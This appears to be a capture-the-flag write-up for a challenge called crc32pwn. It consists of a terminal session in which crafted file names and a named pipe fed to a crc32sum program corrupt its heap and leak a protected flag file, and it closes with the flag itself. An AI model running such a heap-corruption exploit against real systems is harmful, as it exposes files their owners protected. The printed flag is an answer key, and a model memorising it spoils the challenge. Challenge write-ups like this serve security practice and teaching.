# crc32pwn  
```
pwn@0d6cd78fab37:~$ echo -n aaaaaaaaaaaaaaaa > aaaaaaaaaaaaaaaa
echo -n aaaaaaaaaaaaaaaa > aaaaaaaaaaaaaaaa
pwn@0d6cd78fab37:~$ echo -n bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb > bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb > bbbbbbbbbbbbbbbbbb
pwn@0d6cd78fab37:~$ echo -n cccccccccccccccccccccccccccccccccccccccccccccccc > cccccccccccccccccccccccccccccccccccccccccccccccc
cccccccccccccccccccccccccccccccccccccccccccccccccccccccc > cc
pwn@0d6cd78fab37:~$ ls -lh 
ls -lh
total 16K
-rw-r--r-- 1 pwn   pwn  16 Sep  5 13:18 aaaaaaaaaaaaaaaa
-rw-r--r-- 1 pwn   pwn  32 Sep  5 13:18 bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
-rw-r--r-- 1 pwn   pwn  48 Sep  5 13:18 cccccccccccccccccccccccccccccccccccccccccccccccc
-r--r----- 1 admin root 53 Sep  1 13:25 flag.txt
pwn@0d6cd78fab37:~$ mkfifo /tmp/pwn
mkfifo /tmp/pwn
pwn@0d6cd78fab37:~$ crc32sum bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb aaaaaaaaaaaaaaaa cccccccccccccccccccccccccccccccccccccccccccccccc /tmp/pwn .///////////////////////////////////////flag.txt &
/////////////////flag.txt &cccccccccccccccccccc /tmp/pwn .///////////////////////
[1] 10
pwn@0d6cd78fab37:~$ bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb: 47fd49d4
aaaaaaaaaaaaaaaa: cfd668d5
cccccccccccccccccccccccccccccccccccccccccccccccc: 471c41e2


pwn@0d6cd78fab37:~$ echo -n AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP > /tmp/pwn 
echo -n AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP > /tmp/pwn 
pwn@0d6cd78fab37:~$ /tmp/pwn: 00000000
CakeCTF{pr0c3ss1ng_f1l3s_w1th0ut_BUG_1s_sup3r_h4rd!}
: 5f5acf9b
double free or corruption (out)
```
flag: `CakeCTF{pr0c3ss1ng_f1l3s_w1th0ut_BUG_1s_sup3r_h4rd!}`  
